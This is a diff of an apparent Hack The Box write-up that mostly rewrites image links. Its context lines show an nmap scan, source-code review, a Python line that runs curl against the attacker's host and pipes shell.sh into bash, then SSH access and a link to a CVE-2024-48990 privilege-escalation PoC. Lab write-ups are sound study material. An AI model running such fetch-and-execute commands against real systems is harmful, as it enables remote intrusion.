@@ -34,10 +34,10 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 68.44 seconds
 ```
-![[Pasted image 20251130160025.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130160025.png)
 
 /about page:
-![[Pasted image 20251130164627.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130164627.png)
 ```
 tar xvf source_code.tar.gz 
 app.py
@@ -64,7 +64,7 @@ uploads/
 ```
 
 install.md
-![[Pasted image 20251130165002.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130165002.png)
 app.py > python crontab
 
 ```
@@ -116,19 +116,19 @@ os.system("curl 10.10.15.8:8000/shell.sh | bash")
 
 ```
 
-![[Pasted image 20251130164348.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130164348.png)
 
 We have empty user.db in instances from source code // verify on rev shell:
-![[Pasted image 20251130170242.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130170242.png)
 
-![[Pasted image 20251130170406.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130170406.png)
 SSh with creds
 
 Privesc:
-![[Pasted image 20251130170753.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130170753.png)
 
 Search CVE for version:
-![[Pasted image 20251130170903.png]]
+![Image](/assets/img/htb-writeups/Pasted image 20251130170903.png)
 
 Vulnerable to:
 https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing
